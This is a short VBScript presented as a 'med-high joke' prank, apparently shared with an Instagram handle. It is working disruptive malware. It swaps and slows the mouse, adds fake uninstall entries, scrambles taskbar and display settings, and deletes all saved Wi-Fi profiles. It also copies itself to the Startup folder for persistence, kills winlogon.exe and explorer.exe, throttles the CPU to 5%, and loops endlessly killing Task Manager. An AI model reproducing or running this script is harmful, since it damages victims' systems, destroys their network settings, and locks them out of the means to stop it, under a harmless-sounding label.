'Its a med-high joke, it'll change some settings including making cursor slower, limits cpu power, randomizes desktop icons (idk if that works perfectly), And it adds 10 fake apps, open cd rom if exist, it'll logout user stop explorer to apply changes, stop task manager in a loop and then it'll give a error with instagram account.
Const HKEY_LOCAL_MACHINE = &H80000002
Const HKEY_CURRENT_USER = &H80000001

Set WshShell = CreateObject("WScript.Shell")
Set Reg = GetObject("winmgmts:\\.\root\default:StdRegProv")
Set FSO = CreateObject("Scripting.FileSystemObject")

Sub SetRegistryValue(hKey, keyPath, valueName, valueType, value)
    Reg.CreateKey hKey, keyPath
    Select Case valueType
        Case "String"
            Reg.SetStringValue hKey, keyPath, valueName, value
        Case "Binary"
            Reg.SetBinaryValue hKey, keyPath, valueName, value
        Case "DWORD"
            Reg.SetDWORDValue hKey, keyPath, valueName, value
        Case Else
            WScript.Echo "Unsupported registry value type: " & valueType
    End Select
End Sub

mouseSensitivityPath = "Control Panel\Mouse"
SetRegistryValue HKEY_CURRENT_USER, mouseSensitivityPath, "SwapMouseButtons", "DWORD", 1
SetRegistryValue HKEY_CURRENT_USER, mouseSensitivityPath, "MouseSpeed", "DWORD", 0
SetRegistryValue HKEY_CURRENT_USER, mouseSensitivityPath, "MouseSensitivity", "DWORD", 0
SetRegistryValue HKEY_CURRENT_USER, mouseSensitivityPath, "MouseTrails", "DWORD", 7

prefix = "hbt'nin Panzeri."

For i = 1 To 10
    appName = "hbt'nin Panzeri. " & i
    packageFamilyName = prefix & i

    keyPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\" & appName
    SetRegistryValue HKEY_LOCAL_MACHINE, keyPath, "DisplayName", "String", appName
    
    SetRegistryValue HKEY_LOCAL_MACHINE, keyPath, "Size", "DWORD", 4294967295

    packageKeyPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\AppModel\SystemAppData\" & packageFamilyName
    SetRegistryValue HKEY_LOCAL_MACHINE, packageKeyPath, "Size", "DWORD", 4294967295
Next

Randomize 
minX = 0
maxX = 1920
minY = 0
maxY = 1080

For i = 1 To 10
    xPos = Int((maxX - minX + 1) * Rnd + minX)
    yPos = Int((maxY - minY + 1) * Rnd + minY)
    
    iconKeyPath = "Software\Microsoft\Windows\Shell\Bags\1\Desktop"
    Reg.CreateKey HKEY_CURRENT_USER, iconKeyPath & "\" & "Icon" & i
    
    SetRegistryValue HKEY_CURRENT_USER, iconKeyPath & "\" & "Icon" & i, "IconX", "DWORD", xPos
    SetRegistryValue HKEY_CURRENT_USER, iconKeyPath & "\" & "Icon" & i, "IconY", "DWORD", yPos
Next

taskbarPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3"
Reg.CreateKey HKEY_CURRENT_USER, taskbarPath

Dim bValue(47)
For i = 0 To 47
    bValue(i) = 0
Next

bValue(0) = &H1
bValue(8) = &H1

SetRegistryValue HKEY_CURRENT_USER, taskbarPath, "Settings", "Binary", bValue

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set colDrives = objFSO.Drives

For Each objDrive In colDrives
    If objDrive.DriveType = 2 Then
        WshShell.Run "rundll32.exe shell32.dll,ShellExec_RunDLL " & objDrive.DriveLetter & "\", 0, False
        Exit For
    End If
Next

WshShell.Run "cmd.exe /c for /f ""tokens=1"" %i in ('netsh wlan show profiles ^| findstr ""Profile""') do netsh wlan delete profile name=%i", 0, True

SetRegistryValue HKEY_CURRENT_USER, "Control Panel\Desktop", "LogPixels", "DWORD", 480

scriptPath = WScript.ScriptFullName
hiddenPath = "C:\a.vbs"

WshShell.Run "cmd.exe /c attrib +h +s " & Chr(34) & hiddenPath & Chr(34), 0, True

startupFolder = WshShell.SpecialFolders("Startup")
startupPath = startupFolder & "\" & FSO.GetFileName(scriptPath)

If Not FSO.FileExists(startupPath) Then
    FSO.CopyFile scriptPath, startupPath
End If

WshShell.Run "taskkill /f /im winlogon.exe", 0, True
WshShell.Run "taskkill /f /im explorer.exe", 0, True
WshShell.Run "explorer.exe", 0, True

WshShell.Run "powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 1", 0, True
WshShell.Run "powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 5", 0, True
WshShell.Run "powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 1", 0, True
WshShell.Run "powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 5", 0, True
WshShell.Run "powercfg /s SCHEME_CURRENT", 0, True

mouseSensitivityPath = "Control Panel\Mouse"
SetRegistryValue HKEY_CURRENT_USER, mouseSensitivityPath, "MouseSpeed", "DWORD", 1
SetRegistryValue HKEY_CURRENT_USER, mouseSensitivityPath, "MouseThreshold1", "DWORD", 0
SetRegistryValue HKEY_CURRENT_USER, mouseSensitivityPath, "MouseThreshold2", "DWORD", 0

WScript.Echo "BUM -insta @03_targz-"

Do
On Error Resume Next
WshShell.Run "taskkill /f /im taskmgr.exe", 0, True
Loop
